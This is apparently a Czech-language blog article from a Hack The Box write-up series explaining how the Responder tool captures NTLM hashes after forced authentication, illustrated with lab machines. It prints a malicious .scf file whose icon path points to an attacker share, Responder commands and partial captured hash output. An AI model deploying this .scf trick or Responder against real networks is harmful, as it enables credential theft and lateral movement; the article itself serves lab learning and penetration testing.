---
layout: post
author: Tomáš Matějíček
title: "Responder"
date: 2020-10-28
tags: nastroje windows ntlm smb llmnr coercion
---
## Úvod a kontext

`Responder` je v tomhle projektu důležitý hlavně jako praktický nástroj pro okamžik, kdy se podaří přinutit Windows nebo jinou službu, aby se sama autentizovala směrem k útočníkovi. Sám o sobě nevytváří coercion ani neřeší celý útok. Jeho hodnota je v tom, že umí tuto vynucenou autentizaci zachytit a převést do materiálu, se kterým se dá dál pracovat.

Na [Driveru](/driver) zachytí NTLMv2 hash účtu `tony` přes `.scf` soubor. Na [Intelligence](/intelligence) přijme HTTP autentizaci z `Invoke-WebRequest -UseDefaultCredentials`. Na [APT](/apt) zachytí dokonce machine account `APT$`, což dobře ukazuje, že nejde jen o lidské identity. Prakticky související širší vzorec rozebírám i v článku [NTLM coercion a vynucená autentizace](/techniky/ntlm-coercion-a-vynucena-autentizace).

## Co `Responder` v praxi řeší

`Responder` je užitečný tehdy, když už existuje cesta, jak vyvolat odchozí autentizaci:

- přes UNC cestu,
- přes `.scf` nebo podobný souborový formát,
- přes interní skript s implicitní autentizací,
- nebo přes jiný mechanismus, který donutí cíl sáhnout na SMB či HTTP zdroj útočníka.

V takové chvíli `Responder` neřeší "jak obelstít cíl". Řeší:

- zachycení NTLM challenge/response,
- rozlišení, jaký účet se autentizoval,
- a přípravu materiálu pro další krok, typicky cracking nebo návazný relay.

## Nejčastější scénáře využití v tomto projektu

### `.scf` soubor a SMB autentizace

Na [Driveru](/driver) je použití velmi čisté. Po nahrání `.scf` souboru s UNC cestou Windows při vykreslení ikony sáhne na share útočníka a `Responder` zachytí NTLMv2 hash účtu `tony`.

```text
[Shell]
Command=2
IconFile=\\10.10.14.11\share\random.ico
[Taskbar]
Command=ToggleDesktop
```

```bash
responder -wrf -I tun0
```

Výstup:

```text
[SMB] NTLMv2-SSP Username : DRIVER\tony
[SMB] NTLMv2-SSP Hash     : tony::DRIVER:...
```

Tady je prakticky zásadní správně oddělit příčinu a následek:

- `.scf` vytvořil odchozí autentizaci,
- `Responder` ji zachytil,
- a teprve cracking otevřel WinRM foothold.

### Interní skript s `UseDefaultCredentials`

Na [Intelligence](/intelligence) je situace jiná. Žádný `.scf` soubor ani kliknutí uživatele. Rozhoduje automatizační skript `downdetector.ps1`, který pravidelně volá:

```text
Invoke-WebRequest -UseDefaultCredentials
```

Jakmile šlo přidat vlastní DNS záznam `webthacker.intelligence.htb`, skript navázal spojení na útočníkův server a `Responder` zachytil NTLMv2 hash `Ted.Graves`.

```bash
sudo responder -I tun0 -A
```

To je prakticky důležité proto, že dobře ukazuje, jak málo "útočně" může takový trigger vypadat. Není potřeba zranitelná aplikace. Stačí provozní automatizace, která důvěřuje internímu jménu.

### Machine account a technická identita

Na [APT](/apt) je nejzajímavější, že zachycená autentizace nepatří člověku, ale účtu stroje:

```text
[SMB] NTLMv1 Username : HTB\APT$
```

To je výborný praktický příklad toho, proč je chyba vnímat `Responder` jen jako nástroj na "hesla uživatelů". V některých řetězcích je technická identita cennější než běžný účet, protože vede k:

- dumpu tajemství,
- DCSync,
- nebo jinému silnějšímu technickému kontextu.

## Kdy je `Responder` nejlepší volba

Největší smysl dává tehdy, když:

- už existuje realistická coercion cesta,
- je známé, že cíl autentizuje přes NTLM,
- a zachycený materiál má jasný další krok.

Tím dalším krokem může být:

- cracking hashe,
- relay,
- nebo jen potvrzení, jaký účet a jakým směrem se autentizuje.

Bez tohoto návazného kroku je `Responder` spíš jen pasivní sběr.

## Co `Responder` neumí vyřešit za vás

`Responder` sám:

- nevymýšlí coercion vektor,
- neříká, jestli zachycený účet bude provozně hodnotný,
- a nezaručuje, že hash půjde cracknout nebo relayovat.

Na [Driveru](/driver) byl zachycený účet okamžitě zajímavý, protože WinRM byl dostupný a heslo padlo. Na [Intelligence](/intelligence) byl hash mezikrokem k dalšímu doménovému řetězci. Na [APT](/apt) měl cenu machine account. Praktický dopad se tedy liší případ od případu.

## Nejčastější chyby při použití

### Záměna `Responderu` za coercion techniku

Tohle je nejčastější omyl. `Responder` není ten, kdo nutí cíl se autentizovat. Jen stojí na straně útočníka a čeká na spojení, které vyvolal jiný krok.

### Přecenění samotného hashe

Zachycený hash ještě není shell ani admin. Je to materiál, se kterým je potřeba dál pracovat:

- cracknout,
- relayovat,
- nebo použít jako důkaz dalšího problému v trust modelu.

### Ignorování typu účtu

Jestli se autentizuje:

- běžný uživatel,
- servisní účet,
- nebo machine account,

zásadně mění další krok i skutečný dopad.

## Nejčastější praktické scénáře

### Po footholdu objevíte UNC trust nebo automatizaci s implicitní autentizací

Pak má smysl postavit `Responder` a ověřit, kdo se skutečně autentizuje. To je [APT](/apt) a [Intelligence](/intelligence).

### Máte souborový vektor, který donutí Windows sáhnout na váš share

To je čistý případ [Driveru](/driver).

### Potřebujete potvrdit, zda se dá z vynucené autentizace něco vytěžit

Pak `Responder` poskytne první tvrdý důkaz: jaký účet a jaký protokol jsou ve hře.

## Související články v projektu

- Rozbory: [Driver](/driver), [Intelligence](/intelligence), [APT](/apt), [Anubis](/anubis)
- Techniky: [NTLM coercion a vynucená autentizace](/techniky/ntlm-coercion-a-vynucena-autentizace), [Delegovaná práva v AD: DCSync, gMSA, relay, deleted objects](/techniky/delegovana-prava-v-ad-dcsync-gmsa-relay-deleted-objects)

## Co si odnést do praxe

- `Responder` je praktický nástroj pro zachycení vynucené autentizace, ne nástroj, který tuto autentizaci sám vytváří.
- Největší hodnotu má tehdy, když už existuje jasný coercion vektor a promyšlený další krok.
- Skutečný dopad vždy závisí na tom, kdo se autentizoval a co s tímto materiálem lze udělat dál.
